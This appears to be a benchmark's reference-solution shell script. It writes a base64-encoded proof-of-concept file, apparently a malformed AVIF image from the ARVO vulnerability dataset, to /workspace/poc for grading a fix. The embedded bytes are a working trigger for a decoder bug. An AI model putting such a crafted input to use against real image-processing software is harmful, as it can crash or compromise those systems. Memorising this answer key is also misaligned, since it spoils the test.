#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 54ed1dda addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
AAAAHGZ0eXAgICAgICAgIGF2aWYgICAgICAgIAAAAPBtZXRhACAgIAAAACggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAAAAAOICAgICAgICAgIAAAAB5pbG9jACAgIEQAAAEAASAgAAEAAAEUAAABYQAAAChpaW5mACAgIAABAAAAGmluZmUCICAgAAEgIGF2MDEgICAgICAAAABoaXBycAAAAElpcGNvAAAAFCAgICAgICAgICAgICAgICAAAAAOICAgICAgICAgIAAAAAxhdjFDgSAgIAAAABMgICAgICAgICAgICAgICAAAAAXaXBtYQAgICAAAAABAAEEAQKDBCAgICAgICAgEgAKCDsgP+cQICA1MtICECAgICj/IG5mAAAAAAABIAAAICD///////////////////////////////8Q/////////////////////////////////////////////////////////////////////////38A//////////////9nZW1zOja0c5YbLNgPemLWaYMri5uwBSHIOu/GeXMAYXYNMUNvbG9yAAAAAGppcHJwACAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAPgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPJtZXRhAAAA6AAAAChoZGxyAAAAAAAAAABwaWN0AAAAAAAAAAAAAAAAbGliYXZpZgAAAAA=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
